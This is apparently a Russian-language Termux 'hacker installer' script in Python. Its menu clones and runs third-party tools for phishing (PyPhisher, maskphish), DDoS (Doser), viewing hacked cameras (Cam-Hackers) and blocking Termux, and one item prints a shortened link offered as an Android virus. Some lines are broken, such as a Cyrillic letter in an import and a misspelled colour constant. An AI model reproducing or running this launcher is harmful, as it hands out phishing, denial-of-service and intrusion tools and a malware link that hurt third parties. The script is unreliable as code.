import os, time, webbrowser

def res():
    print(Style.RESET_ALL)
    
os.system('clear')
print ('[установка нужных файлов]')
time.sleep(3)
os.system('clear')

#питон2
os.system('pkg install python2')
os.system('clear')
print ('[установка нужных файлов]')
time.sleep(3)
os.system('clear')

#доп.файл
os.system('pip install colorama')
os.system('clear')

import сolorama
from colorama import Fore, Style

print ('\n')
colorama.init()
while True:
    print('\n\n')
    print(colorama.Fore.FREEN+'')
    print (" #                 #          ##    ##              ")
    print ("                   #           #     #              ")
    print ("##   ###    ###   ###    ###   #     #     ##   ### ")
    print (" #   #  #  ##      #    #  #   #     #    # ##  #  #")
    print (" #   #  #    ##    #    # ##   #     #    ##    #   ")
    print ("###  #  #  ###      ##   # #  ###   ###    ##   #   ")
    print ('\n')
    print ("[telegram: @SYPEXHACK]                        [v1.5]")
    res()
    time.sleep(2)
    print ('\n\n')
    print (Fore.CYAN+"    [1] тунелирование <ngrok>")
    print (Fore.CYAN+"    [2] тунелирование <localhost>")
    print (Fore.GREEN+"    [3] фишинг <PyPhisher>")
    print (Fore.RED+"    [4] ддос <Doser>")
    print (Fore.RED+"    [5] заблокировать Termux <!!ОПАСНО!!>")
    print (Fore.WHITE+"    [6] просмотр взломаных камер <CAM-HACKERS>")
    print (Fore.RED+"    [7] получить вирус ссылку <android>")
    print (Fore.YELLOW+"    [8] замаскировать фишинг <maskphish>")
    print ("\n")
    print (Fore.GREEN+"    [77] поддержка автора")
    print (Fore.WHITE+"    [66] тг канал автора")
    print (Fore.CYAN+"    [99] обновить[BETA]")
    print (Fore.WHITE+"    [00] выход")
    res()
    print ("\n\n")
    inp = input ('  Выбери пункт>>> ')
    os.system('clear')
    
    if inp == '1':
        print('['+Fore.RED+'ВНИМАНИЕ'+Fore.WHITE+' ПЕРЕД ЗАПУСКОМ ВКЛЮИТЕ ТОЧКУ ДОСТУПА И МОБ ИНТЕРНЕТ]')
        tru_6 = input('\n Включили? [y/n] >>> ')
        os.system('clear')
        if tru_6 == 'y':
            os.system('pkg install nodejs-lts -y')
            os.system('clear')
            print ('[установка нужных файлов]')
            time.sleep(3)
            os.system('npm install ngrok')
            os.system('clear')
            os.system('npm install ngrok -g')
            os.system('clear')
            print ('[установка нужных файлов]')
            we  = '8080'
            time.sleep(3)
            os.system('clear')
            print('[<ngrok> стандартный порт 8080]')
            tru_5 = input('\n Изменить порт? [y/n] >>> ')
            if tru_5 == 'y':
                os.system('clear')
                we_2 = input('Введите порт>>> ')
                if we_2 == '':
                    os.system('clear')
                    print(' Вы ничего не ввели ')
                    print('[Порт '+we+']')
                    time.sleep(4)
                    os.system('clear')
                    os.system('ngrok http '+we)
                else:
                    os.system('clear')
                    os.system('ngrok http '+we_2)

            if tru_5 == 'n':
                os.system('clear')
                os.system('ngrok http '+we)
            else:
                os.system('clear')
                os.system('ngrok http '+we)

        if tru_6 == 'n':
            os.system('clear')
            print('[пожалуйста включите моб. Точку доступа и повторите]')
            time.sleep(3)
        else:
            os.system('clear')
     


    if inp == '2':   
        os.system('clear')
        print('['+Fore.RED+'ВНИМАНИЕ'+Fore.WHITE+' ПЕРЕД ЗАПУСКОМ ВКЛЮИТЕ ТОЧКУ ДОСТУПА И МОБ ИНТЕРНЕТ]')
        tru_2 = input('\n Включили? [y/n] >>> ')
        os.system('clear')
        if tru_2 == 'y':
            print ('[установка нужных файлов]')
            time.sleep(3)
            
            os.system('pkg install dropbear -y')
            os.system('clear')
            print ('[установка нужных файлов]')
            time.sleep(3)
            os.system('pkg install openssh -y')
            os.system('clear')
            qw = '8080'
            
            print('[<localhost> стандартный порт:8080]')
            tru_3 = input('\n Изменить порт? [y/n] >>> ')
            if tru_3 == 'y':
                os.system('clear')
                qw_2 = input('Введите порт>>> ')
                if qw_2 == '':
                    os.system('clear')
                    print(' Вы ничего не ввели ')
                    print('[Порт '+qw+']')
                    time.sleep(4)
                    os.system('clear')
                    print('[Ваша ссылка находится в самом нижнем ряде]')
                    time.sleep(4)
                    os.system('ssh -R 80:localhost:'+qw+' nokey@localhost.run')
                else:
                    os.system('clear')
                    print('[Ваша ссылка находится в самом нижнем ряде]')
                    time.sleep(4)
                    os.system('ssh -R 80:localhost:'+qw_2+' nokey@localhost.run')

            if tru_3 == 'n':
                os.system('clear')
                print('[Ваша ссылка находится в самом нижнем ряде]')
                time.sleep(4)
                os.system('ssh -R 80:localhost:'+qw+' nokey@localhost.run')
            else:
                os.system('clear')
                print('[Ваша ссылка находится в самом нижнем ряде]')
                time.sleep(4)
                os.system('ssh -R 80:localhost:'+qw+' nokey@localhost.run')
                
        if tru_2 == 'n':
            os.system('clear')
            print('[пожалуйста включите моб. Точку доступа и повторите]')
            time.sleep(3)
            pass
        else:
            os.system('clear')



    if inp == '3':   
        os.system('clear')
        print('['+Fore.RED+'ВНИМАНИЕ'+Fore.WHITE+' ПЕРЕД ЗАПУСКОМ ВКЛЮИТЕ ТОЧКУ ДОСТУПА И МОБ ИНТЕРНЕТ]')
        tru = input('\n Включили? [y/n] >>> ')
        os.system('clear')
        if tru == 'y':
            os.system('git clone https://github.com/KasRoudra/PyPhisher')
            os.system('clear')
            print ('[установка нужных файлов]')
            time.sleep(3)
            os.system('clear')
            os.chdir('PyPhisher')
            os.system('python3 pyphisher.py')
        if tru == 'n':
            os.system('clear')
            pass
        else:
            os.system('clear')


    if inp == '4':    
        os.system('clear')
        os.system('pkg install openssh -y')
        os.system('clear')
        print ('[установка нужных файлов]')
        time.sleep(3)
        os.system('git clone https://github.com/lamer112311/Doser')
        os.system('clear')
        print ('[установка нужных файлов]')
        time.sleep(3)
        os.system('clear')
        os.chdir('Doser')
        os.system('bash install.sh')
        os.system('clear')
        os.system('python doser.py')


    if inp == '5':   
        os.system('git clone https://github.com/fuckwbored/termuxman')
        os.system('clear')
        print ('[установка нужных файлов]')
        time.sleep(3)
        os.system('clear') 
        os.chdir('termuxman')
        os.system('python3 termuxman.py')


    if inp == '6':    
        os.system('pip install requests')
        os.system('clear')
        os.system('git clone https://github.com/AngelSecurityTeam/Cam-Hackers')
        os.system('clear')
        print ('[установка нужных файлов]')
        time.sleep(3)
        os.system('clear') 
        os.chdir('Cam-Hackers')
        os.system('chmod +x *')
        os.system('python cam-hackers.py')


    if inp == '7':
        os.system('clear')
        print('[Генерируется ссылка...]')
        time.sleep(3)
        os.system('clear')
        print('ваша ссылка')
        print("\n")
        print('https://bit.ly/3ild93L')
        print("\n")
        tru_8 = input('нажмите entr чтобы проложить')
        if tru_8 == 'y':
            os.system('clear')
            pass
        else:
            os.system('clear')       


    if inp == '8':
        os.system('git clone https://github.com/jaykali/maskphish.git')
        os.chdir('maskphish')
        os.system('clear')
        print('[Инструкция:В первый ряд вводим вашу фишинг ссылку.')
        print('В второй ряд  вводим ссылку которую мы хотим получить,')
        print('пример: https://Instagram.com В третьем ряде нажимаем entr.')
        print('В итоге получаем редирект ссылку, которая выглядит')
        print('более менее нормально.]')
        time.sleep(10)
        os.system('bash maskphish.sh')


    if inp == '77':
        os.system('xdg-open https://www.donationalerts.com/r/legends_never_die')


    if inp == '99':    
        os.system('git clone https://github.com/777-FOXik-777/installer')
        os.system('clear')
        print ("Загрузка...")
        time.sleep(3)
        os.chdir('installer')
        os.system('python3 installer.py')
        os.system('clear')
        
    if inp == '66':
        os.system('xdg-open https://t.me/SYPEXHACK')
        os.system('clear')
    if inp == '00':
        os.system('clear')
        print('Спасибо за использование [installer]')
        break
